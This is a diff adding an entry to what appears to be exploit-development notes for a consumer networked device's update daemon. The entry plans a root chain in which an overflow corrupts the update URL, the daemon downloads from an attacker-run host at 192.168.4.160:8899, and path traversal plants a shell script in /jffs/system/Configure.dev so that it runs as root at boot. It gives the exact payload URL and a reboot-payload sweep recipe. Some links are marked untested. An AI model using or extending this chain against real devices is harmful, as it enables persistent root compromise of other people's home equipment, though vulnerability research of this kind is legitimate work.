@@ -987,3 +987,25 @@ calibration = fire the REBOOT payload per candidate and watch for the
 THE PRACTICAL RECIPE: sweep the reboot payload at 0x10 steps across the
 band; the first 46s-outage = S found (and the device reboots = re-calibrate
 the NEXT band for the following experiment).
+
+### 2026-11-05: THE COMPLETE ROOT CHAIN — the update-download path traversal
+
+GoldMeadow's sonosFileCreate site-2 (0x102b8e4c, called from 0x102b8fac):
+the created-file path derives from [r31+60] via 0x102b835c — the UPDATE
+download filename. The update URL is fetcher-controlled.
+
+THE CHAIN: overflow → corrupt the update URL (the +6380 URI field carries
+our node string!) → the daemon fetches OUR URL → sonosFileCreate creates
+the file at a URL-derived path → path traversal ("../system/Configure.dev")
+→ /jffs/system/Configure.dev = OUR payload → the next boot runs it as root.
+
+THE MISSING LINK: does the +6380 overflow reach the UPDATE URL field (or
+does the transport re-fetch from the corrupted URI)? The URI-marker probe
+was inconclusive (no re-fetch). The next test: the update-check trigger
+(the daemon's update poll) with the overflow planted — the fetch of the
+MARKER URL from the .84 daemon would appear in the server log.
+
+THE PAYLOAD: the node string = "http://192.168.4.160:8899/../../system/Configure.dev"
+(or the URL-encoded traversal) — the update downloader creates the file
+from the URL path. The CONTENT = the fetched bytes = our .aa (a shell
+script!). The .aa file must BE a valid shell script for this route.
